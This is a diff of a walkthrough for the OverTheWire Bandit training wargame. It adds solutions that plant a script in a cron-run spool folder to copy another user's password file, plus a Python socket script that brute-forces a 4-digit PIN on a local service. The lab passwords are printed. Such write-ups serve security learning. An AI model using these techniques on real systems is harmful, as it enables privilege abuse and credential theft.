@@ -710,54 +710,127 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 #### Question
 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
 
-NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints..
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 
 #### Answer
 
 ```
-    $ ssh -p2220 bandit22@bandit.labs.overthewire.org
+    $ ssh -p2220 bandit23@bandit.labs.overthewire.org
 ```
 
-We have to follow the same steps as previous question. Do 1, 2, 3 of the above question. And now check out the script. 
-
+Again following those steps 1, 2 find the script that is run by cron. 
 ```bash
 #!/bin/bash
 
 myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
-
-cat /etc/bandit_pass/$myname > /tmp/$mytarget
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
 ```
 
-Now this time too the password of the current level is copied to a file in target which is calculated. Now a easier solution would be to create a bash executable of our own that will generate the `mytarget`. 
-So in the `/tmp` folder create a bash file. And save this in that file. 
+What this script does is, it goes through every executable in the folder `/var/spool/$myname` and then executes them and after that deletes them. Now our objective is to get the pass for the next level i.e bandit24. So we can write a script that will fetch that password and store it somewhere. And since we can't run that script we will make this cron do that for us. 
+
+So let's write a script. Now we can access only the `/tmp/` of the server. So let's write one bash there. 
+
+```
+$ vim myscript.sh
+```
+
+and inside that script write this.
 
 ```bash
 #!/bin/bash
-
-myname=bandit23
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
-
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
-
-```
-Now one thing if you look into the perms of the bash file you will notice that the file belongs to `bandit23` so the result of the `whoami` will be `bandit23`.
-Make this file executable and run it 
-
-```
-Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349
-```
-Then again cat the temp file to get the passwd
-
-```
-cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+cat /etc/bandit_pass/bandit24 > /tmp/lvl24pass
 ```
 
+now copy this script to our destination folder but before that make it executable.
 
-**passwd*: `jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n`
+```bash
+chmod +x ./myscript.sh
+cp ./myscript.sh /var/spool/bandit24/
+```
+
+But the cron file had some caveats. 
+`owner="$(stat --format "%U" ./$i)"` Gives us the owner of the file and since we are bandit23 so it will pass without any difficulty. 
+
+Now wait for 1min approx. And run
+
+```
+cat /tmp/lvl24pass
+```
+If it say's `file not found` wait for a couple of secs more. Otherwise it would give us the pass
+
+
+**passwd*: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`
+
+<hr>
+
+### Level 24
+
+#### Question
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+#### Answer
+
+```
+    $ ssh -p2220 bandit24@bandit.labs.overthewire.org
+```
+
+The question is pretty straight forward. There is a daemon(bg process) running on 30002. Try `nc localhost 30002` you will see it says,
+
+>I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+So now we have to enter the pass of the level 24 and a pin. And we need to bruteforce the pincode. 
+
+You can try using a bash script or a python script. At first my try was to use `subprocess` and run the command ` cat password+pin | nc localhost 3002` but there was a problem, it was very slow, because we are making a connection and closing a connection every second. But what I noticed is that if we give a wrong input the connection is not closed, so I should rather use something like socket in python to make a one time connection and then keep feeding data. 
+
+If you are new to socket go through the docs or this [GFG article](https://www.geeksforgeeks.org/socket-programming-python/)
+
+So using this we will create a socket and connect it to localhost and port 30002. Bruteforce all the pins in the format asked, and check the response. It will take a few seconds because in my case 2588 was the correct pin. And along with that there was the password . 
+
+Here is my script.
+
+```python
+
+import socket
+
+s = socket.socket()
+s.connect(('127.0.0.1', 30002))
+print('Socket Connected')
+s.recv(1024)
+
+for pin in range(10000):
+    data = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + str(pin).zfill(4)+'\n'
+    s.sendall(data.encode())
+    print('PIN: ', str(pin).zfill(4), end=' ')
+    response = s.recv(1024).decode()
+
+    if "Wrong" in response:
+        print('WRONG')
+    else:
+        print('CORRECT')
+        print(response)
+        break
+
+
+```
+
+**passwd*: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
 
 References:
 * [CheatSheet](https://gist.github.com/bradtraversy/ac3b1136fc7d739a788ad1e42a78b610#file-myscript-sh)
+                                                                       
